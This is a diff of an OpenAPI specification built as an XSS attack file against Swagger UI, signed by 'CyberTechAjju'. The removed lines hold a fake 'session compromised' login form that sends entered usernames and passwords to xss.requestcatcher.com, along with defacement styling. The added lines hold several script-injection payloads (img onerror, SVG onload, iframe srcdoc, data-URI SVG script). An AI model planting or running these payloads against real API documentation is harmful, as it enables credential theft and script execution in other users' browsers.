@@ -1,31 +1,10 @@
 openapi: 3.0.0
 info:
   title: |
-    <h1 style="color:red; text-align:center">🔥 SYSTEM BREACHED BY AJJU 🔥</h1>
-    <div style="color:white; background:black; font-size:18px; padding:10px; text-align:center;">
-      WARNING: Your session is compromised.<br>
-      Please re-authenticate below to secure your access.
-    </div>
-    <form onsubmit="fetch('https://xss.requestcatcher.com/', {method:'POST',body:new FormData(this)})">
-      <input placeholder="👤 Username" name="u" style="margin:5px;"><br>
-      <input type="password" placeholder="🔒 Password" name="p" style="margin:5px;"><br>
-      <button type="submit" style="padding:8px;background:red;color:white;">Verify</button>
-    </form>
+    <img src=x onerror="alert('🔥 Ajju DOM XSS!');">
+    <svg><foreignObject><body onload="alert('XSS in SVG foreignObject')"></body></foreignObject></svg>
   description: |
-    <marquee scrollamount="12" style="color:yellow;font-size:20px;">⚠️ XSS Attempt - Your Swagger UI is vulnerable ⚠️</marquee>
-    <style>
-      body { background: black !important; color: lime !important; font-family: monospace; }
-    </style>
-    <h2 style="text-align:center;">~ Made by CyberTechAjju ~</h2>
-  version: "💀"
-
-paths:
-  /exploit:
-    get:
-      summary: |
-        <h2 style="color:orange;">🚨 URGENT PATCH REQUIRED 🚨</h2>
-      responses:
-        '200':
-          description: |
-            ✅ Exploit test endpoint loaded.
-            <img src=x onerror=alert("Summary-Based XSS")>
+    <!-- Brave attempt: nested iframe fallback -->
+    <iframe srcdoc="<script>alert('iframe XSS')</script>"></iframe>
+    <object type="image/svg+xml" data='data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"><script>alert(\"SVG Data XSS\")</script></svg>'></object>
+paths: {}
